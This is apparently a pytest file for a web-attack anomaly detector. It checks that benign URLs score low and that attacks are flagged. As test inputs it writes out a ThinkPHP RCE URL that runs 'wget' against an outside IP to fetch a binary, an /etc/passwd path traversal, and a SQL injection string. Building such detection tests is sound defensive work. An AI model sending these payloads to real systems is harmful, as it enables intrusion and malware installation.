"""Tests for the detector against the artifact actually trained.

These are the only tests that depend on `models/detector.joblib`. If the artifact
is absent — a fresh clone without a training run — they are skipped rather than
failed, so the suite stays green in a clean environment.

This is where the approach's central promise is verified: the model was fitted on
benign traffic only and still separates attacks from normal browsing.
"""

from pathlib import Path

import pytest

from app.pipeline.detector import NORMALIZED_THRESHOLD, Detector, ModelNotLoaded
from tests.conftest import SQLI_URL, make_event

MODEL_PATH = Path("models/detector.joblib")

pytestmark = pytest.mark.skipif(
    not MODEL_PATH.exists(),
    reason="artifact missing; run scripts/train_model.py",
)


@pytest.fixture(scope="module")
def detector() -> Detector:
    return Detector(MODEL_PATH)


def test_artifact_loads_with_metadata(detector):
    assert detector.is_loaded
    assert detector.load_error is None
    assert detector.metadata.get("trained_at")
    assert detector.metadata.get("approach", "").startswith("novelty")


def test_normalized_threshold_is_stable(detector):
    """The API and the correlator must not know the model's scale."""
    assert detector.event_threshold == NORMALIZED_THRESHOLD == 0.5


def test_missing_model_does_not_bring_the_process_down(tmp_path):
    """A missing model is an operational error: /health degrades, the service boots."""
    absent = Detector(tmp_path / "does-not-exist.joblib")
    assert absent.is_loaded is False
    assert "not found" in absent.load_error
    with pytest.raises(ModelNotLoaded):
        absent.score_events([make_event()])
    with pytest.raises(ModelNotLoaded):
        absent.explain(make_event())


def test_injection_scores_above_browsing(detector):
    events = [
        make_event(url="/product/31893/62100/ordinary-product"),
        make_event(url="/image/60844/productModel/200x200"),
        make_event(url=SQLI_URL),
    ]
    scores = detector.score_events(events)
    assert scores[2] > scores[0]
    assert scores[2] > scores[1]
    assert scores[2] >= detector.event_threshold


def test_normal_browsing_stays_below_the_threshold(detector):
    events = [
        make_event(url=f"/product/{i}/detail", offset=i, status=200) for i in range(20)
    ]
    above = sum(score >= detector.event_threshold for score in detector.score_events(events))
    assert above == 0


def test_rce_is_detected_without_ever_being_seen(detector):
    """Zero-shot by construction: no attack entered the fit."""
    event = make_event(
        url="/index.php?s=/index/think/invokefunction&function=call_user_func_array"
        "&vars[0]=shell_exec&vars[1][]=wget http://185.244.25.221/bins/x86",
        status=400,
    )
    assert detector.score_events([event])[0] >= detector.event_threshold


def test_traversal_is_detected(detector):
    event = make_event(url="/download?file=../../../../etc/passwd", status=404)
    assert detector.score_events([event])[0] >= detector.event_threshold


def test_empty_batch_returns_an_empty_list(detector):
    assert detector.score_events([]) == []


def test_explain_locates_the_payload(detector):
    """The span must contain the payload, not the URL's common prefix."""
    span = detector.explain(make_event(url=SQLI_URL))
    assert span
    assert span in SQLI_URL


def test_explain_of_a_normal_url_does_not_break(detector):
    assert detector.explain(make_event(url="/product/1"))


def test_length_does_not_determine_the_score(detector):
    """The model measures improbability, not size.

    A long but site-typical URL must score below a short injection. The measured
    correlation between score and length on the test set is -0.011, and a baseline
    using length alone achieves recall 0.000 at 1% FPR.
    """
    long_normal = make_event(
        url="/m/filter/p5767,t156?name=ماشین-اصلاح&productType=electric-shavers"
    )
    short_malicious = make_event(url="/x?id=1' OR 1=1--")
    scores = detector.score_events([long_normal, short_malicious])
    assert len(long_normal.decoded_url) > len(short_malicious.decoded_url)
    assert scores[1] > scores[0]
